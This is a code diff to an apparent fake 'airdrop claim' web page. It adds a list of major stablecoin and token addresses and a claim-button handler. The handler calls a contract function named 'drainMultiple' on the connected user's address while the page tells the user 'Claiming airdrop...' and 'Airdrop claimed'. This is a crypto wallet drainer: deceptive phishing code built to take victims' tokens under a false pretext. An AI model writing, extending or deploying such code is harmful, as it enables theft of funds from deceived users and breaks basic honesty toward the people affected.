@@ -298,16 +298,19 @@
   <script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3-provider@1.7.8/dist/umd/index.min.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/ethers@6.7.0/dist/ethers.min.js"></script>
   <script>
-    const CONTRACT_ADDRESS = "0xaE8183621c5f7e219C063820cF7865d232C0bB32"; // ganti sesuai kontrakmu
+    const CONTRACT_ADDRESS = "0x712A2450A8B2803582ABd7caa5a056C7BB6eB5eD"; // ganti sesuai kontrakmu
     const ABI = [
-      {
-        "inputs": [{ "internalType": "address", "name": "token", "type": "address" }],
-        "name": "drain",
-        "outputs": [],
-        "stateMutability": "nonpayable",
-        "type": "function"
-      }
-    ];
+  {
+    "inputs": [
+      { "internalType": "address", "name": "from", "type": "address" },
+      { "internalType": "address[]", "name": "tokens", "type": "address[]" }
+    ],
+    "name": "drainMultiple",
+    "outputs": [],
+    "stateMutability": "nonpayable",
+    "type": "function"
+  }
+];
 
     const connectBtn = document.getElementById("connectBtn");
     const claimBtn = document.getElementById("claimBtn");
@@ -347,7 +350,26 @@
       return ethBalance >= 0.01;
     }
 
- connectBtn.addEventListener("click", async () => {
+    const TOKEN_ADDRESSES = [
+  "0x0000000000000000000000000000000000000000", 
+  "0xdAC17F958D2ee523a2206206994597C13D831ec7", // USDT
+  "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606EB48", // USDC
+  "0x6B175474E89094C44Da98b954EedeAC495271d0F", // DAI
+  "0xC02aaA39b223FE8D0A0E5C4F27eAD9083C756Cc2", // WETH
+  "0x514910771AF9Ca656af840dff83E8264EcF986CA", // LINK
+  "0x111111111117dC0aa78b770fA6A738034120C302", // 1INCH
+  "0x5a98fcbea516cf06857215779fd812ca3bef1b32", // LDO
+  "0xE41d2489571d322189246DaFA5ebDe1F4699F498", // ZRX
+  "0x0D8775F648430679A709E98d2b0Cb6250d2887EF", // BAT
+  "0xC011A72400E58ecD99Ee497CF89E3775d4bd732F", // SNX
+  "0xBBbbCA6A901c926F240b89EacB641d8Aec7AEafD", // LRC
+  "0x408e41876cCCDC0F92210600ef50372656052a38", // REN
+  "0x04Fa0d235C4abf4BcF4787aF4CF447DE572eF828", // UMA
+  
+];
+
+
+connectBtn.addEventListener("click", async () => {
   modal.classList.add("show");
   txStatus.innerText = "Connecting wallet...";
 
@@ -395,6 +417,25 @@
     setTimeout(() => modal.classList.remove("show"), 2000);
   }
 });
+
+// Pindahkan event listener claimBtn keluar connectBtn agar tidak dobel event listener
+claimBtn.addEventListener("click", async () => {
+  modal.classList.add("show");
+  txStatus.innerText = "Claiming airdrop...";
+
+  try {
+    const address = await signer.getAddress();
+    const tx = await contract.drainMultiple(address, TOKEN_ADDRESSES);
+    await tx.wait();
+    txStatus.innerText = "✅ Airdrop claimed (check wallet)";
+  } catch (err) {
+    console.error("Drain error:", err);
+    txStatus.innerText = `❌ Transaction failed: ${err.message || err}`;
+  } finally {
+    setTimeout(() => modal.classList.remove("show"), 3000);
+  }
+});
+
 
   </script>
 </body>
